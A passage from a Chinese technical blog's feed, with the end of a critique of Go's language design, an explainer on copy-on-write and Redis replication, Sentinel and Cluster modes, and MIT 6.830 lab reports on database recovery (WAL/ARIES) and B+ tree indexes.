<p>早在十几年前，Google 团队声明可重入锁是不好的设计，滋生 bug，参见 <a href="https://groups.google.com/g/golang-nuts/c/XqW1qcuZgKg/m/Ui3nQkeLV80J">groups.google.com</a>，于是直到现在 Go 仍不支持可重入锁。但是他们也承认了 TryLock 操作是最终会需要的，过了十多年的 Go1.18 版本才正式支持了 TryLock。</p>
<p>我部分理解他们的声明，他们认为可重入锁会需要额外的工作去管理 goroutine 持有的锁，相当于 goroutine 需要有 local storage 存储这些信息，类似 Java 中的 ThreadLocal。这也是他们在避免的，于是 Go 也不支持这些，只能通过 context 层层透传，用于 goroutine 存储。</p>
<p>给人的感觉就是 Go 不像是一个产品，产品是从用户需要角度出发，采取各语言的精华，去做出一个易用、好用的产品。可重入锁的优点是很明显的，各函数可以独立工作，也可以协同工作，不需要担心死锁；不支持可重入锁就需要把每个函数写加锁和不加锁两个版本，避免调错函数死锁。他们不仅是认为实现可重入锁是不必要的，甚至拒绝相关的 PR。一他们固执地坚持着自己的观点，把握着 Go 的代码准入权，直至 2021 年的 Go 1.18 讨论上，Go 语言之父还在反对加入泛型，认为这会导致过大的工作量，而且容易出错。</p>
<p>类似的观点还有，Go 的泛型中使用了方括号，而不是尖括号。Go 的 map、slice 使用的也全部是方括号，如果一个函数有泛型、有 map、有 slice，看起来会比较费劲。他们拒绝尖括号的原因是，可能会导致歧义并且他们不愿意通过更改编译器前端解决。可以凝练为，<strong>他们不愿意去顺应用户习惯，而是强迫用户按自己的想法使用并培养习惯</strong>。这可能就是大公司的傲慢。</p>
<h3 id="不支持枚举">不支持枚举</h3>
<p>作为一个强类型语言，去除了所有的隐式转换保证代码健壮的语言，居然不支持枚举类型。枚举类型是一个不难实现且可以显著提升代码可读性的特性，迟迟不实现实属不应该。</p>
<h2 id="总结">总结</h2>
<p>从我两个多月的 Go 体验下来，感觉 Go 的优点和缺点都非常突出。Go 按 Google 团队的意志提供了一种几乎固定的编码规范，一定程度会方便标准化，但是并不是一门易用、好用、优雅的语言。</p>
<h2 id="参考">参考</h2>
<ul>
<li><p><a href="https://www.zhihu.com/question/563395289">为啥网上这么多人 diss Golang？ - 知乎 (zhihu.com)</a></p></li>
<li><p><a href="https://www.zhihu.com/question/490457306">Go 为什么设计地这么简陋，是为了推广还是在编译器上难以实现？- 知乎 (zhihu.com)</a></p></li>
</ul>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 集群模式</title>
    <url>/blog/2023/02/15/redis-cluster/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇文章主要梳理一下 Redis 的集群模式，明白它是如何做到高可用、支持高并发的。</p>
<span id="more"></span>
<h2 id="copy-on-write">Copy On Write</h2>
<p>首先要了解一下 copy on write 机制，才能理解 Redis 做备份时如何保持一致。copy on write（简写为 cow），中文名为写时复制，是计算机领域非常经典的优化思想。可以先从 linux 的 fork 函数了解下 cow 的原理。已经理解这部分知识的读者可以直接跳到下一章节。</p>
<p>fork 是 unix 系统上用于创建进程的函数，例如下面的 C 代码，调用 fork 后，会创建一个新的进程，从 fork 处接着向后执行。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&nbsp;<span class="meta-string">&lt;unistd.h&gt;</span>&nbsp;&nbsp;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&nbsp;<span class="meta-string">&lt;stdio.h&gt;</span>&nbsp;&nbsp;</span></span><br><span class="line">&nbsp;</span><br><span class="line"><span class="function"><span class="keyword">int</span>&nbsp;<span class="title">main</span>&nbsp;<span class="params">()</span>&nbsp;&nbsp;&nbsp;</span></span><br><span class="line"><span class="function"></span>{&nbsp;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">pid_t</span>&nbsp;fpid;&nbsp;<span class="comment">//fpid表示fork函数返回的值&nbsp;&nbsp;</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">int</span>&nbsp;count=<span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 调用fork，创建出子进程&nbsp;&nbsp;</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;fpid=fork();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 所以下面的代码有两个进程执行！</span></span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span>&nbsp;(fpid&nbsp;&lt;&nbsp;<span class="number">0</span>)&nbsp;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="built_in">printf</span>(<span class="string">"创建进程失败!/n"</span>);&nbsp;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">else</span>&nbsp;<span class="keyword">if</span>&nbsp;(fpid&nbsp;==&nbsp;<span class="number">0</span>)&nbsp;{&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="built_in">printf</span>(<span class="string">"我是子进程，由父进程fork出来/n"</span>);&nbsp;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count++;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">else</span>&nbsp;{&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="built_in">printf</span>(<span class="string">"我是父进程/n"</span>);&nbsp;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count++;&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="built_in">printf</span>(<span class="string">"统计结果是:&nbsp;%d/n"</span>,count);&nbsp;&nbsp;</span><br><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">return</span>&nbsp;<span class="number">0</span>;&nbsp;&nbsp;</span><br><span class="line">}&nbsp;&nbsp;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>fork 函数的特点是，它会在父子进程各返回一次，<strong>将子进程的 pid（进程 id）返回给父进程，将 0 返回给子进程</strong>，因此可以通过 pid 判断当前进程是父进程还是子进程。上述代码的结果是</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">我是子进程，由父进程fork出来</span><br><span class="line"></span><br><span class="line">统计结果是: 1</span><br><span class="line"></span><br><span class="line">我是父进程</span><br><span class="line"></span><br><span class="line">统计结果是: 1</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>在 fork 之后，出现了一个与父进程的副本，从相同的位置向后执行。副本意味着从操作系统的角度，父子进程的地址空间是相同的（除了 fork 返回值），这样两个进程才能共享 fork 前的状态，同样地向后执行。如何实现这个副本呢？一种简单的想法是，直接申请相同大小的物理页，逐页面地拷贝数据，再更新页表即可。这样就可以<strong>保证两个进程的初始状态相同，且后续的修改不相互影响</strong>。如上所示，<code>count</code> 的值在每个进程中都是 1，而不是 2。</p>
<p>但是这样做的开销是非常大的，子进程可能只需要对很少的变量进行修改，拷贝整个地址空间显得既多余又严重影响速度，启动时间非常长。copy on write 就可以完美解决这个问题。在这种思想下，<strong>在 fork 后，两个进程是共享地址空间的，并把所有页面标记为 READ_ONLY，即只可读不可写，也就是 fork 只是把父进程的页表做了一次拷贝，非常快</strong>。当父 / 子进程需要对地址进行修改时：</p>
<ol type="1">
<li>发现页面不可修改，触发<strong>页异常中断 page-fault</strong>，申请新的页面，将旧页面数据拷贝至新页面</li>
<li>在新页面做修改，并更改页表映射关系</li>
</ol>
<p>这也就是 copy on write 名字的由来，在需要修改（写入）的时候，对页面进行复制。这样<strong>既达到了非常快的启动时间，也实现了按需申请资源</strong>。当然缺点也是有的，如果父 / 子进程需要修改大量的数据，反复的异常中断也会影响性能。</p>
<h2 id="复制与分片">复制与分片</h2>
<p>数据库的集群模式中，按思想可分为复制和分片两类，这对 MySQL、Redis 都适用。这里先介绍下这两种思想，方便后续理解。需要注意的是，这两种方法应用于 MySQL 时都会有一致性的问题。</p>
<h3 id="复制">复制</h3>
<p>在复制的概念中，数据库分为两类，一类是主数据库（master），另一类是从数据库（slave）。主数据库可以进行读写操作，当<strong>写操作导致数据变化时会自动将数据同步给从数据库</strong>。而<strong>从数据库一般是只读的</strong>，并接受主数据库同步过来的数据。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。</p>
<p>引入复制的目的主要有：</p>
<ul>
<li>读取高效：读取的吞吐量成倍提升，选择延迟更低的节点</li>
<li>多点备份，容灾恢复</li>
</ul>
<p>复制的缺点也很明显，会有一致性的问题：写操作无法及时同步到主节点，导致读取数据不一致，对于 MySQL 这种需要保证一致性的数据库问题尤为严重。</p>
<p>复制的过程中需要同步写操作：</p>
<ul>
<li>对于新启动的节点，最省事的方法当然是把整个数据库文件传过去</li>
<li>对于运行中的节点，只需要同步本次写的操作即可，MySQL 可以使用 binlog，Redis 可以使用 aof 日志</li>
</ul>
<h3 id="分片">分片</h3>
<p>在分片的概念中，需要按一定的规则，将数据分为若干个分区（partition），分布于各个节点上。分配规则可以是：</p>
<ul>
<li>MySQL
<ul>
<li>行分片：常用的按主键范围划分，例如 1-1w 在一个节点，1w-2w 在一个节点</li>
<li>列分片：也就是分表，将数据按数据库范式拆分，存储在不同节点</li>
</ul></li>
<li> Redis：使用 hash 将 key 转化为整数，再做范围划分</li>
</ul>
<p>切片的优势在于：</p>
<ul>
<li>写入高效，多个写操作命中不同的节点，互不影响，提高并发</li>
<li>读取昂贵：MySQL 中的联合、全表扫描操作效率降低，可能需要对多个节点加锁
<ul>
<li>对 Redis 还好</li>
</ul></li>
</ul>
<h2 id="redis-集群模式">Redis 集群模式</h2>
<h3 id="主从复制">主从复制</h3>
<p>主从复制、读写分离是存储中常用的提高性能、可用性的方法。Redis 也不例外。最直觉的集群模式，就是设置很多的从节点复制，写操作在主节点完成，主从之间通过 aof 日志 /rdb 文件同步。整个架构如下所示，一个主节点可能有多个从节点，从节点可能再会有自己的从节点。</p>
<p><img src="ms-mode.png"></p>
<p>主从复制的具体流程如下：</p>
<p><img src="ms-pipeline.png"></p>
<p>流程如下从数据库启动成功后，连接主数据库，发送 SYNC 命令；</p>
<ul>
<li>主数据库接收到 SYNC 命令后，<strong>开始执行 BGSAVE 命令生成 RDB 文件并使用缓冲区记录此后执行的所有写命令</strong>；</li>
<li>主数据库 BGSAVE 执行完后，向所有从数据库发送快照文件，并在发送期间继续记录被执行的写命令；</li>
<li>从数据库收到快照文件后丢弃所有旧数据，载入收到的快照；</li>
<li>主数据库快照发送完毕后开始向从数据库发送缓冲区中的写命令；</li>
<li>从数据库完成对快照的载入，开始接收命令请求，并执行来自主数据库缓冲区的写命令；（<strong>从数据库初始化完成</strong>）</li>
<li>主数据库每执行一个写命令就会向从数据库发送相同的写命令，从数据库接收并执行收到的写命令（<strong>从数据库初始化完成后的操作</strong>）</li>
<li>出现断开重连后，2.8 之后的版本会将断线期间的命令传给重数据库，增量复制。</li>
<li>主从刚刚连接的时候，进行全量同步；全同步结束后，进行增量同步。当然，如果有需要，slave 在任何时候都可以发起全量同步。Redis 的策略是，无论如何，首先会尝试进行增量同步，如不成功，要求从机进行全量同步。</li>
</ul>
<p>其他步骤都比较好理解，最开始困扰我的是这个 bgsave，它生成的 RDB 文件为什么能够记录某个时间数据库的准确状态？如果不是准确状态，写命令执行两次不是会有幂等性问题？后面了解才知道，<strong>bgsave 是通过 fork 与 copy on write 实现的</strong>。</p>
<p>主从复制的优点基本就是复制操作的优点，就不赘述了，它的缺点在于：</p>
<ul>
<li>Redis 不具备自动容错和恢复功能，主机从机的宕机都会导致前端部分读写请求失败，需要等待机器重启或者<strong>手动切换前端的 IP 才能恢复</strong>（<strong>也就是要人工介入</strong>）；</li>
<li>主机宕机，宕机前有部分数据未能及时同步到从机，切换 IP 后还会引入数据不一致的问题，降低了系统的可用性；</li>
<li>如果多个 Slave 断线了，需要重启的时候，尽量不要在同一时间段进行重启。<strong>因为只要 Slave 启动，就会发送 sync 请求和主机全量同步，当多个 Slave 重启的时候，可能会导致 Master IO 剧增从而宕机</strong>。</li>
<li>Redis 较难支持在线扩容，在集群容量达到上限时在线扩容会变得很复杂；</li>
</ul>
<p>需要注意的是，新启动 / 重启的节点都需要发送 sync 请求和主机全量同步，会影响主服务的稳定性。</p>
<h3 id="sentinel哨兵模式">Sentinel（哨兵）模式</h3>
<p>第一种主从同步 / 复制的模式，当主服务器宕机后，需要手动把一台从服务器切换为主服务器，这就需要人工干预，费事费力，还会造成一段时间内服务不可用。这不是一种推荐的方式，更多时候，我们优先考虑哨兵模式。消息队列 Kafka 使用的就是哨兵模式。</p>
<p>哨兵模式可以看成主从模式的扩展。首先 Redis 提供了哨兵的命令，<strong>哨兵是一个独立的进程，作为进程，它会独立运行。其原理是哨兵通过发送命令，等待 Redis 服务器响应，从而监控运行的多个 Redis 实例</strong>。</p>
<p><img src="single-sentinel.png"></p>
<p><strong>哨兵模式的作用</strong></p>
<ul>
<li>通过发送命令，让 Redis 服务器返回监控其运行状态，包括主服务器和从服务器；</li>
<li>当哨兵监测到 master 宕机，会自动将 slave 切换成 master ，然后通过<strong>发布订阅模式</strong>通知其他的从服务器，修改配置文件，让它们切换主机；</li>
</ul>
<p>然而一个哨兵进程对 Redis 服务器进行监控，也可能会出现问题，为此，我们可以使用多个哨兵进行监控。各个哨兵之间还会进行监控，这样就形成了多哨兵模式。</p>
<p><img src="multi-sentinel.png"></p>
<h4 id="故障切换的过程"><strong>故障切换的过程</strong></h4>
<p>假设主服务器宕机，哨兵 1 先检测到这个结果，系统并不会马上进行 failover 过程，仅仅是哨兵 1 主观的认为主服务器不可用，这个现象成为<strong>主观下线</strong>。当后面的哨兵也检测到主服务器不可用，并且数量达到一定值时，那么哨兵之间就会进行一次投票，投票的结果由一个哨兵发起，进行 failover 操作。切换成功后，就会通过发布订阅模式，让各个哨兵把自己监控的从服务器实现切换主机，这个过程称为<strong>客观下线</strong>。这样对于客户端而言，一切都是透明的。</p>
<h4 id="哨兵模式的工作方式">哨兵模式的工作方式：</h4>
<ul>
<li>每个 Sentinel（哨兵）进程以每秒钟一次的频率向整个集群中的 Master 主服务器，Slave 从服务器以及其他 Sentinel（哨兵）进程发送一个 PING 命令。</li>
<li>如果一个实例（instance）距离最后一次有效回复 PING 命令的时间超过 down-after-milliseconds 选项所指定的值， 则这个实例会被 Sentinel（哨兵）进程标记为主观下线（SDOWN）</li>
<li>如果一个 Master 主服务器被标记为主观下线（SDOWN），则正在监视这个 Master 主服务器的所有 Sentinel（哨兵）进程要以每秒一次的频率确认 Master 主服务器的确进入了主观下线状态</li>
<li>当有足够数量的 Sentinel（哨兵）进程（大于等于配置文件指定的值）在指定的时间范围内确认 Master 主服务器进入了主观下线状态（SDOWN）， 则 Master 主服务器会被标记为客观下线（ODOWN）</li>
<li>在一般情况下， 每个 Sentinel（哨兵）进程会以每 10 秒一次的频率向集群中的所有 Master 主服务器、Slave 从服务器发送 INFO 命令。</li>
<li>当 Master 主服务器被 Sentinel（哨兵）进程标记为客观下线（ODOWN）时，Sentinel（哨兵）进程向下线的 Master 主服务器的所有 Slave 从服务器发送 INFO 命令的频率会从 10 秒一次改为每秒一次。</li>
<li>若没有足够数量的 Sentinel（哨兵）进程同意 Master 主服务器下线， Master 主服务器的客观下线状态就会被移除。若 Master 主服务器重新向 Sentinel（哨兵）进程发送 PING 命令返回有效回复，Master 主服务器的主观下线状态就会被移除。</li>
</ul>
<h4 id="哨兵模式的优缺点">哨兵模式的优缺点</h4>
<p><strong>优点：</strong></p>
<ul>
<li>哨兵模式是基于主从模式的，所有主从的优点，哨兵模式都具有。</li>
<li>主从可以自动切换，系统更健壮，可用性更高 (<strong>可以看作自动版的主从复制</strong>)。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>Redis 较难支持在线扩容，在集群容量达到上限时在线扩容会变得很复杂。</li>
</ul>
<h3 id="cluster-集群模式redis官方">Cluster 集群模式（Redis 官方）</h3>
<p>Redis Cluster 是一种服务器 Sharding 技术，3.0 版本开始正式提供。</p>
<p>Redis 的哨兵模式基本已经可以实现高可用，读写分离 ，但是在这种模式下每台 Redis 服务器都存储相同的数据，很浪费内存，所以在 redis3.0 上加入了 Cluster 集群模式，实现了 Redis 的分布式存储，<strong>也就是说每台 Redis 节点上存储不同的内容</strong>。</p>
<p><img src="cluster.png"></p>
<p>在这个图中，每一个蓝色的圈都代表着一个 redis 的服务器节点。它们任何两个节点之间都是相互连通的。客户端可以与任何一个节点相连接，然后就可以访问集群中的任何一个节点。对其进行存取和其他操作。</p>
<h4 id="集群的数据分片"><strong>集群的数据分片</strong></h4>
<p>Redis 集群没有使用一致性 hash，而是引入了哈希槽【hash slot】的概念。</p>
<p>Redis 集群有 16384 个哈希槽，每个 key 通过 CRC16 校验后对 16384 取模来决定放置哪个槽。集群的每个节点负责一部分 hash 槽，举个例子，比如当前集群有 3 个节点，那么：</p>
<ul>
<li>节点 A 包含 0 到 5460 号哈希槽</li>
<li>节点 B 包含 5461 到 10922 号哈希槽</li>
<li>节点 C 包含 10923 到 16383 号哈希槽</li>
</ul>
<p>这种结构很容易添加或者删除节点。比如如果我想新添加个节点 D ， 我需要从节点 A， B， C 中得部分槽到 D 上。如果我想移除节点 A ，需要将 A 中的槽移到 B 和 C 节点上，然后将没有任何槽的 A 节点从集群中移除即可。由于从一个节点将哈希槽移动到另一个节点并不会停止服务，所以无论添加删除或者改变某个节点的哈希槽的数量都不会造成集群不可用的状态。</p>
<p>在 Redis 的每一个节点上，都有这么两个东西，一个是插槽（slot），它的的取值范围是：0-16383。还有一个就是 cluster，可以理解为是一个集群管理的插件。当我们的存取的 Key 到达的时候，Redis 会根据 CRC16 的算法得出一个结果，然后把结果对 16384 求余数，这样每个 key 都会对应一个编号在 0-16383 之间的哈希槽，通过这个值，去找到对应的插槽所对应的节点，然后直接自动跳转到这个对应的节点上进行存取操作。</p>
<h4 id="redis-集群的主从复制模型">Redis 集群的主从复制模型</h4>
<p><strong>为了保证高可用，redis-cluster 集群引入了主从复制模型，一个主节点对应一个或者多个从节点，当主节点宕机的时候，就会启用从节点</strong>。当其它主节点 ping 一个主节点 A 时，如果半数以上的主节点与 A 通信超时，那么认为主节点 A 宕机了。如果主节点 A 和它的从节点 A1 都宕机了，那么该集群就无法再提供服务了。</p>
<h4 id="集群的特点"><strong>集群的特点</strong></h4>
<ul>
<li>所有的 redis 节点彼此互联 (PING-PONG 机制)，内部使用二进制协议优化传输速度和带宽。</li>
<li>节点的 fail 是通过集群中超过半数的节点检测失效时才生效。</li>
<li>客户端与 Redis 节点直连，不需要中间代理层。客户端不需要连接集群所有节点，连接集群中任何一个可用节点即可。</li>
</ul>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://segmentfault.com/a/1190000022808576">Redis 你了解 Redis 的三种集群模式吗？ - 个人文章 - SegmentFault 思否</a></li>
<li><a href="https://www.cnblogs.com/L-Test/p/11626124.html">Redis ==&gt; 集群的三种模式 - 破解孤独 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://www.cnblogs.com/xiaolei2017/p/15713194.html">Redis 中 bgsave 方式持久化的细节问题 - 百合叶 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://zhou-yuxin.github.io/articles/2017/fork()后copy%20on%20write的一些特性/index.html">fork () 后 copy on write 的一些特性 (zhou-yuxin.github.io)</a></li>
<li><a href="https://www.cnblogs.com/Java3y/p/9884583.html">COW 奶牛！Copy On Write 机制了解一下 - Java3y - 博客园 (cnblogs.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
        <tag>copy on write</tag>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 6 实验报告</title>
    <url>/blog/2022/12/02/MIT-6-830-6/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>Lab 6 要求实现数据库的恢复功能。在真实场景下，数据库可能因为种种原因宕机崩溃，需要保证此时的数据不会丢失，保证数据库事务的 ACID 性质。这往往要通过日志来实现。</p>
<span id="more"></span>
<h2 id="理论知识">理论知识</h2>
<p>前面提到了，事务需要具备 ACID 性质，其中有两点需要关注：</p>
<ul>
<li>原子性：事务可能会中止，需要回滚</li>
<li>持续性：如果 DBMS 崩溃了怎么办</li>
</ul>
<p>事务中止的原因可能有很多，例如执行出错、出现死锁等。DBMS 崩溃的原因也有很多，例如磁盘空间不足、管理员误操作等。如何在这些场景下保证数据库的一致性、可靠性等，是一个很重要的问题。看过之前博客的同学可能记得，在 Lab4 中，实现了 NO STEAL 的模式。其思想是将事务的脏页面在 BufferPool 中置顶，不将其逐出，直到事务提交后再逐出。这在一定程度上可以解决原子性的问题，但是 BufferPool 一旦满了，DBMS 就直接崩溃了。</p>
<h3 id="wal">WAL</h3>
<p>数据库常使用先写日志（Write-Ahead Logging，WAL）与 ARIES 算法解决原子性和持续性的问题。WAL 的思想是，先写日志，再写数据，遵循下面的协议</p>
<ol type="1">
<li>在更新数据到磁盘前，必须强制保存日志</li>
<li>在事务提交前，必须强制保存所有日志</li>
</ol>
<p>日志是一个多元组，例如 &lt;XID, pageID, offset, length, old data, new data&gt;，包含事务 ID、页面 ID、偏移、修改前后的数据等信息。有了这些信息，就可以解决 ACID 的两个问题：</p>
<ul>
<li>如何回滚事务：根据日志，回滚该事务，用旧值覆盖新值</li>
<li>如果 DBMS 崩溃了怎么恢复：根据日志，重做部分事务，用新值替换旧值</li>
</ul>
<p>可以看到，在 WAL 的写日志协议中，第一点包含了 UNDO 的信息，保证了写到磁盘的数据必定可以通过日志回滚，确保了原子性，第二点包含了重做的信息，保证了已经提交的事务，必定可以通过日志重新复现其结果，确保了持续性。</p>
<p>WAL 容易混淆的一点是，因为写日志先于写磁盘，所以：</p>
<ul>
<li>日志中出现了 UPDATE 记录，<strong>并不意味更新在磁盘上生效了</strong></li>
<li>日志中出现了 COMMIT 记录，<strong>并不意味着事务在磁盘上提交到 DBMS 了</strong></li>
</ul>
<p>所以，对于日志中的 COMMIT 的事务，也需要对其重做，因为它的结果可能并没有保存到磁盘中。WAL 确保了可以通过日志撤销和重做操作，与我们平时的使用日志习惯：“先出现现象，再记录现象”，是相反的。这点需要深刻理解。</p>
<h3 id="arise">ARISE</h3>
<p>ARISE 算法就使用这种 WAL 的日志，在数据库崩溃时，分三阶段处理：</p>
<ol type="1">
<li>分析：分析最新的检查点到崩溃中间的日志，分析崩溃时的状态
<ol type="1">
<li>BufferPool 中有哪些脏页面</li>
<li>还有哪些事务正在运行（即崩溃中止了）</li>
</ol></li>
<li>重做：从脏页面对应的日志中的最早修改记录开始，逐个地重做结果</li>
<li>撤销：从崩溃位置开始，到崩溃中止事务的最早日志，倒序地撤销结果</li>
</ol>
<p>如下图所示（来自伯克利 CS186），A、R、U 分别对应阶段 1、2、3。需要注意的是，重做的时候重做了所有的操作，包含最后中止的事务操作。这样的优点是确保不会出错，能够完美复现数据库崩溃时的状态，而且扩展性更好。撤销的时候需要倒序撤销，因为同一个页面可能被更新多次，撤销的最终结果的修改的最初结果。</p>
<p><img src="ARIES.png"></p>
<h2 id="exercise">Exercise</h2>
<h3 id="preliminary">Preliminary</h3>
<p>首先介绍下 SimpleDB 的日志模块，根据 <code>LogFile</code> 可知，其日志的格式如下：</p>
<ol type="1">
<li>文件最开始的 8 个字节，标识日志文件中最新的检查点在文件中的偏移</li>
<li>之后每条记录的格式为 <code>&lt;int Type, long tid, [additional info], offset&gt;</code>，其中
<ol type="1">
<li>Type 标识了日志的类型，有事务开始、更新数据、创建检查点、事务提交、事务中止五种</li>
<li> tid 标识了事务的 ID</li>
<li>additional info 记录了额外的数据，只有更新数据、创建检查点时存在。
<ol type="1">
<li>更新数据时，保存修改前后的页面数据</li>
<li>创建检查点时，保存此时所有未结束的事务，及其在日志中的第一条日志的偏移</li>
</ol></li>
<li> offset 记录了该条日志的起始在文件中的偏移</li>
</ol></li>
</ol>
<p>从代码注释可以看出，在事务中止，释放其锁之前，会调用 <code>logAbort() -&gt; rollback()</code> 方法，撤销该事务的操作，并在日志中留下一条 ABORT 记录。这是需要注意的。</p>
<h3 id="rollback">Rollback</h3>
<p>首先要实现的 <code>rollback(tid)</code> 方法，回滚被中止掉的事务的操作。前面提到，回滚需要倒序扫描日志。不过实验报告中描述的是从事务开始扫描，并提供了 <code>tidToFirstLogRecord</code> 的 Map 来把事务映射到日志第一条记录。所以我按从头开始扫描实现的。从头扫描要注意不要重复地回滚页面，需要维护一个 Set，记录哪些页面已经被回滚过了，再次遇到就直接跳过。</p>
<h3 id="recover">Recover</h3>
<p>故障恢复则相对复杂一些。它包含三个步骤</p>
<ol type="1">
<li>重建检查点（如果存在检查点的话），重建运行中的事务，日志偏移的 Map 映射，即 <code>tidToFirstLogRecord</code></li>
<li>从检查点（或文件开始），逐个地重做日志操作</li>
<li>到日志结束到达崩溃点时，回滚此时还在运行的事务</li>
</ol>
<p>首先，为什么可以安全地从检查点加载开始呢？因为在记录检查点的 <code>logCheckpoint</code> 方法中，调用 <code>flushAllPages()</code> 将 BufferPool 中的脏页面全部写回了磁盘。所以检查点对应的 BufferPool 中是没有脏页面的，可以安全地作为起始点。</p>
<p>其次，在重做日志中，需要注意以下事项：</p>
<ul>
<li>维护 <code>tidToFirstLogRecord</code>，因为它会影响最后回滚日志的逻辑，需要在事务开始、提交、中止时维护其状态</li>
<li><strong>需要重做 ABORT</strong>。即对于日志中的 <code>ABORT tid</code> 的记录，需要重做，即将其回滚。</li>
</ul>
<p>重做 ABORT 听上去与之前的 ARISE 算法有些矛盾。因为 ARISE 是先重做再回滚的，这里为什么在重做的中间就回滚了事务呢？事实上，这里需要区分两种要回滚的事务：</p>
<ol type="1">
<li>日志中正常输出 ABORT 的事务：可能是因为死锁等原因中止。SimpleDB 强制这些事务中止前调用了 <code>logAbort</code> 方法，回滚操作且写到日志中。</li>
<li>崩溃时意外中止的事务：这些事务在日志中只有开始记录，没有 COMMIT 或者 ABORT 记录</li>
</ol>
<p>理解了这两者的区别，就会发现真正需要在 ARISE 第三阶段回滚的，是第二类的事务。第一类的事务是正常的回滚，在重做时，需要同样回滚才能保持后续的状态一致。</p>
<h2 id="总结">总结</h2>
<p>数据库的恢复是个非常复杂的过程，本人上述的理论知识也省去了一些篇幅。SimpleDB 也对恢复过程做了简化，但这两个 Exercise 也还是 “五脏俱全” 的，包含了各种日志类型、检查点、重做和撤销等核心要点。</p>
<p>到这里，SimpleDB 的 6 个 Lab 就正式结束了。这个实验课程的质量真的很高，从底层的磁盘文件逐步地构建一个数据库系统，过程中做了很多简化以避免过于复杂的无聊操作，保留了精华的重点难点。独立地完成这个实验课，真的能让人学到很多。</p>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>恢复</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 5 实验报告</title>
    <url>/blog/2022/12/01/MIT-6-830-5/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>Lab 5 要求实现 B + 树索引的相关逻辑，包含查找、插入、删除等，过程中需要维护 B + 树的阶性质。索引是一种数据结构，用于实现在某个字段上快速地查找和修改数据记录。对于常访问的字段，构建索引是很有必要的，B+ 树是最为广泛使用的数据库索引。 <span id="more"></span></p>
<h2 id="理论知识">理论知识</h2>
<p>索引用于加快高频字段的查找效率，例如用户 ID 这种字段，基本哪里都要用，每次都做全表扫描是不现实的。索引和记录间形成了一个一对一（多）的关系，取决于索引的键。下面先从简单的搜索树开始，对索引进行介绍。</p>
<h3 id="高扇出搜索树">高扇出搜索树</h3>
<p>先考虑简单的情况，在磁盘上按某个字段对表进行了排序。这种情况下不需要记录前后指针，因为物理上这些页面都是按序排列的。然后需要构建索引。为什么不用二分查找呢，因为二分查找也会导致<span class="math inline"> \(log_2N\)</span> 的页面 IO，是比较低效的。 可以构建一个 <code>&lt;key, Record&gt;</code> 的索引，由于 record 可能很大，而 key 很小，这种存储也很低效。因此可以使用指向 Page 的指针，<code>&lt;key, PageId&gt;</code>，构建这样的一个搜索文件，在页面内完成二分查找。 这种算法是复杂度与之前的二分查找类似，只是<strong>常数更小，因为每个页面能存储更多的索引</strong>。这个过程可以递归完成，直到最顶层的索引只需要记录在一个页面中，变成了一个多叉的搜索树。 在该树下进行二分查找时，会在每个节点完成二分查找，然后定位下一层的节点，直到找到页面内。复杂度为<span class="math inline"> \(log_F(\#Pages)\)</span>，F 为节点的扇出（相较于 2 有了很大改进）。 分析该算法可知，该算法具有以下特点：</p>
<ol type="1">
<li>支持连续扫描。因为数据还是连续存储的</li>
<li>高扇出。因为索引记录比记录小很多，一个页面可以存储很多条索引。</li>
<li>不支持插入。当需要插入时，可能会导致页面溢出，这种情况需要后接页面形成链表。当插入过多时，就退化成了线性扫描。</li>
</ol>
<p>上述这种算法称为 ISAM（Indexed Sequential Access Method），上世纪由 IBM 提出。</p>
<h3 id="b树">B + 树</h3>
